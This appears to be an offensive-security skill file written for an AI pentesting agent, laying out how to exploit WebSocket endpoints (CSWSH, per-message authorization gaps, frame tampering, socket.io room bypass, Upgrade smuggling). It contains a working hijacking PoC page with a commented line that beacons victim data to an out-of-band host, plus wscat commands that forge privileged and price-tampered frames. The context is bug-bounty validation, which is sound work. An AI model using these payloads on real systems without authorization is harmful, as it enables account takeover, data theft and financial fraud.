---
name: WebSocket Security
description: Exploit WebSocket endpoints — CSWSH, missing per-message auth, message tampering, socket.io/SignalR namespace & room authz bypass, and handshake-layer Upgrade smuggling on real-time apps.
tags: [websocket, cswsh, socket-io, real-time, authz-bypass, request-smuggling]
recommended_tools: [http_request, http_repeater, http_intruder, execute_command, curl, python3, nmap_scan, jq]
vuln_classes: []
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-websocket/SKILL.md]}
---

# WebSocket Security

WebSocket endpoints (`ws://`, `wss://`, socket.io, SignalR, Phoenix Channels) frequently authenticate once at the handshake and then trust everything. The high-value bug classes:

- **CSWSH (Cross-Site WebSocket Hijacking)** — cookie-authenticated handshake + no CSRF/per-connection token + missing Origin check → an attacker page opens the socket as the victim and streams their data. If the stream carries a session/refresh/CSRF token this escalates to full ATO. High–Critical. Structurally this is CSRF over a WebSocket upgrade (CWE-352 + CWE-1385).
- **No per-message auth** — handshake auth present, but individual frames are never re-authorized → privileged messages (`deleteUser`, `getSecretConfig`) accepted (CWE-306).
- **Message tampering** — modify in-flight frame values (`price`, `qty`, `userId`, `amount`) in trading/game/checkout apps → financial fraud (CWE-345 / CWE-639).
- **socket.io / SignalR / Phoenix namespace & room authz bypass** — connect to a privileged namespace or join another user's room with no permission check → cross-tenant real-time exfil.
- **Handshake-layer Upgrade smuggling** — a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred → an HTTP-smuggling tunnel past WAF/authz.

## Reference cases (calibration)

Use these to gauge what a real WS finding looks like and how it is proven. Do not invent report IDs or payouts.

| Source / ID | Class | Lesson |
|---|---|---|
| PortSwigger Web Security Academy — "Cross-site WebSocket hijacking" | CSWSH | Canonical model: cookie-auth handshake + no CSRF token + missing Origin check → attacker reads/sends as victim. |
| Christian Schneider — original CSWSH write-up (2013) | CSWSH | First public technique; PoC must prove victim-data receipt in the attacker browser, not just a `101`. |
| CVE-2020-7662 — `websocket-extensions` (Node) ReDoS | DoS | Crafted `Sec-WebSocket-Extensions` header → catastrophic backtracking. The handshake header is an attack surface, not just frames. |
| CVE-2024-37890 — `ws` (Node) DoS | DoS | Many handshake request headers exhaust the server — the handshake itself is parser-attackable pre-frames. |

Only these CVEs are asserted with exact IDs because they are verifiable. For any case where you are not certain of the exact identifier, describe the technique with no citation — a wrong CVE is worse than none.

---

## Phase 1 — Discover WebSocket endpoints

```bash
# Grep JS bundles for WS clients / handshake URLs
grep -rE "new WebSocket|io\(|io\.connect|socket\.io|new SockJS|signalr|Phoenix\.Socket|wss?://" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_.-]*socket[^'\"]*|/signalr[^'\"]*|/cable\b)" | sort -u

# Crawl URLs for realtime hints
grep -iE "socket|/ws\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|notifications" \
  recon/$TARGET/urls.txt | sort -u

# Probe the handshake (101 = upgrade supported)
curl -sI -o /dev/null -w "%{http_code}\n" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"

# socket.io polling handshake leaks Engine.IO version + sid
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo

# Non-standard WS ports
nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open
```

Browse the app through your proxy first, then enumerate live sockets, message schemas, and which frames carry auth-sensitive data from the WebSocket history.

---

## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)

CSWSH requires THREE conditions together. Missing any one breaks the attack:
- **(a)** the handshake authenticates via an **ambient credential** (a cookie sent automatically), and
- **(b)** there is **no unpredictable per-connection token** in the handshake (no `?token=`, no bearer in `Sec-WebSocket-Protocol`, no body nonce), and
- **(c)** the server **does not enforce Origin**.

```bash
# Step 1 — Confirm the handshake auth model (DevTools → Network → WS → Headers).
#   Look for:  Cookie: session=...   AND the ABSENCE of any per-request token.
#   If a unique token rides the handshake, CSWSH is NOT cross-site exploitable.

# Step 2 — Probe Origin enforcement (a SIGNAL, not a confirmation)
wscat -c "wss://$TARGET/ws" \
  --header "Origin: https://evil.com" \
  --header "Cookie: session=YOUR_SESSION"
# A 101 from a foreign Origin only proves the handshake opened. The server may
# still validate Origin at the message layer or require a token in the first
# app-level frame. Treat 101 as a candidate; move to Step 3.
```

```html
<!-- Step 3 — Real PoC: host on the attacker origin, open it while a SEPARATE
     victim account is logged into TARGET in the same browser. Confirmed only
     if attacker JS RECEIVES the victim's data (or sends a privileged frame).
     Cross-origin JS cannot set Origin/Cookie — the browser does, which is
     exactly the threat model. -->
<html><body><pre id="out"></pre><script>
var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
ws.onopen = () => {
  log("[+] 101 opened from attacker origin");
  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
};
ws.onmessage = e => {
  log("VICTIM-DATA: " + e.data);
  // Exfil PROOF out-of-band so receipt is logged:
  // navigator.sendBeacon("https://<oast-id>.oast.site/cswsh?d=" + encodeURIComponent(e.data));
};
ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
function log(s){document.getElementById("out").textContent += s + "\n";}
</script></body></html>
```

**False-positive killers:**
- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade then send nothing, or close on the first authenticated frame.
- Verify received data belongs to a **different account** than the attacker, using a unique marker / distinct victim PII planted in account B.
- Exfil the received payload to an **OAST listener** so receipt is recorded out-of-band — this is your impact proof.
- If a per-connection token rides the handshake (URL, sub-protocol, or first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.

---

## Phase 3 — Missing / weak per-message authentication

Handshake auth ≠ per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.

```bash
# No cookie at all — does the server process app frames?
wscat -c "wss://$TARGET/ws"
# > {"type":"getUserData","userId":1}
# > {"type":"getAdminPanel"}

# Low-priv session sending high-priv actions
wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"
# > {"action":"deleteUser","userId":999}
# > {"action":"getSecretConfig"}
```

**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel). A frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly.

---

## Phase 4 — Message tampering (financial / game / checkout)

```bash
# Intercept + edit in-flight frames. Try server-trusted client values:
#   {"price":100}      -> {"price":0.01}
#   {"amount":1}       -> {"amount":9999}
#   {"userId":123}     -> {"userId":1}        # impersonate admin
#   {"orderTotal":...} -> recompute downstream?

# wscat replay of a tampered frame
wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
# > {"action":"buy","amount":1,"price":0.01}
```

**Validate:** the tampered value must persist server-side — confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument.

---

## Phase 5 — socket.io / SignalR / Phoenix namespace & room authz bypass

Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.

```bash
# 1) Open the raw socket.io WebSocket (Engine.IO v4)
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
  --header "Cookie: session=YOUR_SESSION"

# 2) Respond to the server's Engine.IO OPEN ('0{...}') so the connection lives,
#    then CONNECT to a namespace with a socket.io CONNECT packet.
#    CORRECT packet to join /admin:   40/admin,
#       4 = Engine.IO MESSAGE,  0 = socket.io CONNECT,  /admin, = namespace
#    (NOT a ?nsp= query param — see Phase 7. NOT 42 — 42 is MESSAGE+EVENT.)
# > 40/admin,
#    Server replies 40/admin,{"sid":"..."} on success, or 44/admin,{...} on
#    rejection. A 40 success to a privileged namespace as a low/no-priv user
#    is the bug.

# 3) Once in a namespace, emit an EVENT (42) to join another user's room:
# > 42/admin,["join",{"room":"user_999_private"}]
# > 42["subscribe",{"channel":"admin_events"}]      # root namespace
#    Watch for 42 EVENT frames carrying ANOTHER user's data.
```

**Validate:** distinguish *connected to namespace* from *received privileged data*. Confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.

> **SignalR analogue:** negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization.
> **Phoenix Channels:** `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.

---

## Phase 6 — Handshake-layer Upgrade smuggling (NOT frame smuggling)

Once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.

The technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently — e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is "upgraded" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).

```bash
# Detection is HTTP-layer, not frame-layer. Use http_repeater and toggle ONE
# handshake variable at a time, comparing front-vs-origin behavior:

#  A) Valid-looking upgrade but unsupported version:
#     Upgrade: websocket
#     Connection: Upgrade
#     Sec-WebSocket-Version: 777          <- origin should 426; does the proxy still tunnel?
#     Sec-WebSocket-Key: <16-byte base64>

#  B) Upgrade header present but Connection: keep-alive (mismatch)
#  C) Smuggled second request body after a "successful" 101, then send a normal
#     follow-up request on the same connection and watch for a desynced response.
```

**Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — OAST-confirmed, never on a single ambiguous response.

---

## Phase 7 — socket.io / Engine.IO specifics

```bash
# Version + initial sid (handshake JSON after the leading Engine.IO digit)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
# Old/EOL socket.io & Engine.IO stacks have known advisories — fingerprint the
# server version here and the client lib version from the JS bundles, then check
# that release's advisories.

# Namespace selection is a PROTOCOL message, not a URL param.
#   WRONG:  wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket&nsp=/admin"
#           ^ `nsp` is NOT a recognized socket.io query param — silently ignored,
#             you connect to the ROOT namespace "/". You believe you tested /admin
#             but you did not.
#   RIGHT:  open the socket, then send the CONNECT packet  40/admin,  (Phase 5).

# Forged/replayed sid against the polling transport (session fixation / hijack probe)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"
#   400 "Session ID unknown" = good. A 200 that resumes another sid's stream = bug.
```

---

## Tools

```bash
npm install -g wscat                 # CLI WS client (raw + socket.io)
# websocat — alt client; supports text/binary + autoreconnect
# Proxy WebSockets history: intercept/edit/replay frames.
# HTTP-request-smuggler tooling: handshake-upgrade smuggling test cases.
# OAST listener: prove out-of-band receipt from a CSWSH/smuggling PoC.
```

Use `http_repeater` / `http_request` for the handshake and Upgrade-smuggling probes, and `execute_command` to drive `wscat`/`websocat`.

---

## Chaining

| WS finding | Chain to | Impact |
|---|---|---|
| CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
| No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
| Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
| Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
| Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF / cache poison (High–Critical) |

Related surfaces: CSWSH is a CSRF + WebSocket-upgrade combo (see CSRF skills). WS endpoints accepting a URL/connection-target param (`?proxy=`, `?url=`) are SSRF surfaces (→ cloud metadata `169.254.169.254`). Sockets that don't re-validate session on reconnect create persistence bugs. `ws://` on a non-standard port exposes PII in frames to on-path interception.

---

## Validation (mandatory before reporting)

- **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **OAST**. A bare `101` from a foreign Origin is NOT a finding.
- **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
- **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
- **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
- **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.
- **Reject:** a `101` alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any "confirmed" claim lacking out-of-band / cross-account proof.

**Severity:**
- CSWSH leaking session/refresh token → ATO: **Critical**
- CSWSH → real-time session-data theft: **High**
- No auth on admin/privileged WS actions: **Critical**
- Financial message tampering (server-confirmed): **Critical**
- Namespace/room subscription bypass (cross-tenant): **High**
